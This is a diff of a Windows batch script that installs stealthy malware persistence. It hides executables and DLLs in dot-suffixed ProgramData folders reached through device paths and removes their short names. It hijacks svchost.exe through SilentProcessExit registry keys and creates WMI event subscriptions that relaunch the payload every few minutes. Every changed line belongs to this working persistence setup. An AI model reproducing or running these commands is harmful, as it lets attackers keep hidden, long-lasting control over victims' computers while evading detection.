@@ -40,10 +40,10 @@ mkdir \\.\%ProgramData%\logdata..\
 mkdir \\.\%ProgramData%\diaglogs..\
 
 copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\logdata..\"
-move /Y "%ProgramData%\Comms\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
+move /Y "%ProgramData%\Comms\IconLib.dll" "\\.\%ProgramData%\logdata..\"
 
 copy /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\diaglogs..\"
-move /Y "%ProgramData%\Comms\Kape.dll" "\\.\%ProgramData%\diaglogs..\con.ini"
+move /Y "%ProgramData%\Comms\Kape.dll" "\\.\%ProgramData%\diaglogs..\"
 
 move /Y "%ProgramData%\Comms\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
 move /Y "%ProgramData%\Comms\vcruntime140.dll" "\\.\%ProgramData%\config..\"
@@ -57,7 +57,7 @@ fsutil file setshortname C:\ProgramData\diaglogs..\ ""
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini" /f /reg:64
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\IconLib.dll" /f /reg:64
 
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="SCM" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="SCM"' DELETE
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="MCS" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="MCS"' DELETE
@@ -73,11 +73,11 @@ wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name=
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SCM\"", Consumer="CommandLineEventConsumer.Name=\"SCM\""
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Event", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Event", CommandLineTemplate="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Event", CommandLineTemplate="\\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\IconLib.dll"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Event\"", Consumer="CommandLineEventConsumer.Name=\"Event\""
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Consumer", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 240 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Consumer", CommandLineTemplate="\\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\con.ini"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Consumer", CommandLineTemplate="\\.\%ProgramData%\diaglogs..\Index.exe \\.\%ProgramData%\diaglogs..\Kape.dll"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Consumer\"", Consumer="CommandLineEventConsumer.Name=\"Consumer\""
 
 takeown /f %ProgramData%\Classic.{BB64F8A7-BEE7-4E1A-AB8D-7D8273F7FDB6}
